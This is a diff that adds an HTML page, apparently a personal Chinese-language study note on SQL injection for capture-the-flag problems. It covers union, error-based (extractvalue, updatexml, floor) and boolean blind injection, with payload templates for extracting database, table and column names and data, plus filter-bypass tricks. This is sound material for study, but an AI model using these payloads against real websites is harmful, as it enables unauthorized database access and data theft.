@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sql</title>
+    <style> 
+        body{
+           overflow: scroll;
+            margin: 0;
+            background-color:#ffffff;
+        }
+        table{
+            border-collapse: collapse;
+        }
+        table,th,td{
+            border:1px solid black;
+        }
+        ul{
+            list-style-type:none;
+            margin:0;
+            overflow:hidden;
+            border:1px solid #C8C7C5;
+            background-color:#002FA7;
+        
+        }
+        li {
+        float:left;
+        }
+        li a{
+            display:block;
+            color:#C8C7C5;
+            text-align:center;
+            padding:14px 16px;
+            text-decoration:none;
+        }
+        li a:hover{
+        background-color:#0086a793
+        }
+        
+        </style>
+        </head>
+        <body>
+        <div style="background-color:#f1f1f1;
+        text-align: center;
+        padding: 40px;
+        ">
+        <img src="https://www.helloimg.com/images/2023/04/15/oX9ldr.webp" alt="逸十三" width="120px" height="120px"/>
+        </div>
+        <div >
+        <ul>
+           
+            <li><a class="active" href="https://yi1three.github.io/boke/note.html">返回上一页</a></li>>
+           
+        </ul>
+</div>
+<div style="max-width: 700px;
+        margin: 10px auto;
+      
+        padding:15px;
+        line-height: 1.7;"
+        >
+<h1 style="text-align:center;">sql注入的笔记</h1>
+<p style="
+position:absolute;
+left:5%;">  SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，
+    在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息<br>
+  对于sql注入的题型需记住<b>MySQL默认在数据库中存放一个"information_schema"的数据库，在该库中，需要记住三个表名，分别是SCHEMATA、TABLES和COLUMNS。
+    SCHEMATA表存储该用户创建的所有数据库名的库名。TABLES表存储该用户创建的所有的数据库的库名和表名，库名为：TABLES_SCHEMA，表名为：TABLE_NAME，字段名为：COLUMN_NAME。
+    </b><br>
+简单来说，看下表：<br></p>
+</div>
+<div style="max-width: 700px;
+        margin: 10px auto;
+       text-align: center;
+      margin-top: 10%;
+        padding:20px;
+        line-height: 2;"
+        >
+<table>
+    <tr>
+        <th>名称</th>
+        <th>作用</th>
+    </tr>
+    <tr>
+        <td>information_schema</td>
+        <td>存放下列三个表的数据库</td>
+    </tr>
+    <tr>
+        <td>schemata</td>
+        <td>存储该用户创建的所有数据库名的库名</td>
+    </tr>
+    <tr>
+        <td>tables</td>
+        <td>存储该用户创建的所有的数据库的库名和表名</td>
+    </tr>
+    <tr>
+        <td>table_schema</td>
+        <td>库名</td>
+    </tr>
+    <tr>
+        <td>table_name</th>
+        <td>表名</td>
+    </tr>
+    <tr>
+        <td>column_name</td>
+        <td>字段名</td>
+    </tr>
+</table>
+</div>
+<div>
+<p style="
+position:absolute;
+
+left:5%;">
+sql语句：<b>select &nbsp; 字段名  &nbsp;from  &nbsp;库名.表名,加where表条件查询。</b><br>
+
+limit用法：limit的使用格式为limit  &nbsp;m,n,其中m是指记录开始的位置，从0开始，表示第一条记录；n是指n条记录。例如limit  &nbsp;0,1表示从第一条记录开始，取一条记录，不使用limit和使用limit查询的结果。
+<b>重要函数：·database() 当前网站使用的数据库
+    ·version() 当前MySQL的版本
+    ·user() 当前MySQL的用户</b>
+    解题一般顺序：<br>
+    判断and 和 or是否被过滤<br>
+    （可能需要判断注入点（union  &nbsp;select））<br>
+    爆库名<br>
+    爆表名<br>
+    爆字段名<br>
+    爆字段内容<br>
+    （联合注入union  &nbsp;select：思路同普通sql注入，判断注入点：num  &nbsp;union &nbsp;select &nbsp;1,2……回显哪个数字哪个就是注入点，之后在注入点拼接语句即可。）<br>
+    报错注入：
+extractvalue方法：里面用select语句，不能用union select<br>
+
+concat()函数<br>
+1.功能：将多个字符串连接成一个字符串。<br>
+2.语法：concat(str1,str2,…)<br>
+返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。<br>
+
+extractvalue报错注入语句格式:<br>
+
+?id=2 &nbsp;and &nbsp;extractvalue(null,concat(0x7e,(sql语句),0x7e))<br>
+
+mid函数：截取字段长符，显示后面的字符<br>
+语法：select&nbsp; mid(column_name,start[,length]) &nbsp;from &nbsp;table_name<br>
+
+updatexml方法：<br>
+语句格式：?id=1 &nbsp;and &nbsp;updatexml(1,concat(0x7e,(sql语句),0x7e),1)<br>
+其余同上<br>
+
+floor方法<br>
+原理：利用
+
+select &nbsp;count(*),floor(rand(0)*2)x &nbsp;from &nbsp;information_schema.character_sets&nbsp; group &nbsp;by&nbsp; x
+导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。<br>
+
+4.盲注<br>
+盲注其实是SQL注入的一种，之所以成为盲注是因为他不会根据你SQL注入的攻击语句返回你想要知道的错误信息。
+<br>
+(1)布尔盲注（使用sqlmap或者burp：1.burp爆破
+2.）<br>
+布尔盲注只会回显True和False两种情况。<br>
+length() 返回字符串的长度<br>
+substr() 截取字符串<br>
+ascii() 返回字符串的ASCII码
+<br>
+·获取数据库的长度<br>
+and (select &nbsp;length(database()))>=长度    //可以通过大于等于来进行猜测数据库的长度<br>
+
+·逐字猜解数据库名<br>
+
+and (select&nbsp; ascii(substr(database(),位数，1)))=ASCII码  //位数的变化即通过ASCII码以及猜解的数据长度求出数据库的库名<br>
+
+·猜解表名数量<br>
+
+and (select &nbsp;count(table_name) &nbsp;from vinformation_schema.tables&nbsp; where &nbsp;table_schema=database())=数量<br>
+
+·猜解某个表的长度<br>
+
+and (select&nbsp; length(table_name) &nbsp;from &nbsp;information_schema.tables &nbsp;where &nbsp;table_schema=database() &nbsp;limit &nbsp;n,1)=长度<br>
+//同理n从0来表示变化的表来求该库下的对应的表的长度<br><br>
+
+·逐位猜解表名<br>
+
+and (select &nbsp;ascii(substr(table_name,1,1)) &nbsp;from &nbsp;information_schema.tables &nbsp;where &nbsp;table_schema = database() &nbsp;limit &nbsp;n,1)=ascii码 #从前面的1变化是求表名，而n变化是对应的库中的表
+<br><br>
+·猜解列名数量<br>
+
+and (select &nbsp;count(*) &nbsp;from &nbsp;information_schema.columns&nbsp; where &nbsp;table_schema=database() &nbsp;and&nbsp; table_name = 表名)=数量<br>
+#information_schema.columns     专门用来存储所有的列<br><br>
+
+·猜解某个列长度
+<br>
+and &nbsp;(select length(column_name) &nbsp;from &nbsp;information_schema.columns &nbsp;where&nbsp; table_name="表名" &nbsp;limit n,1)=长度
+<br><br>
+·逐位猜解列名<br>
+
+and &nbsp;(select &nbsp;ascii(substr(column_name,位数，1)) &nbsp;from &nbsp;information_schema.columns &nbsp;where &nbsp;table_name="表名" limit &nbsp;n,1)=ascii码
+
+·判断数据的数量
+<br><br>
+and &nbsp;(select &nbsp;count(列名)&nbsp; from &nbsp;表名)=数量
+<br>
+·猜解某条数据的长度
+<br><br>
+and &nbsp;(select&nbsp; length(列名) &nbsp;from &nbsp;表名 &nbsp;limit n,1)=长度
+<br><br>
+·逐位猜解数据
+<br>
+and &nbsp;(select &nbsp;ascii(substr(user,位数,1))&nbsp; from&nbsp; 表名 &nbsp;limit&nbsp; n,1)=ascii码
+<br>
+绕过技巧<br>
+(1)substr函数绕过<br>
+left(str,从左边开始截取的位置)<br>
+right(str,从右边开始截取的位置)<br>
+substring(str,从左边开始截取的位置)<br>
+mid(str,index,key)截取str从index开始，截取len的长度<br>
+lpad(str,len,padstr) &nbsp;rpad(str,len,padstr)在str的左(右)两边填充给定的padstr到指定的长度len，返回填充的结果<br>
+(2)等于号(=)绕过<br>
+1.用in()<br>
+2.用like<br>
+(3)ASCII()绕过<br>
+hex() bin() ord()<br>
+
+</p>
+
+</div>
+
+</body>
+</html>
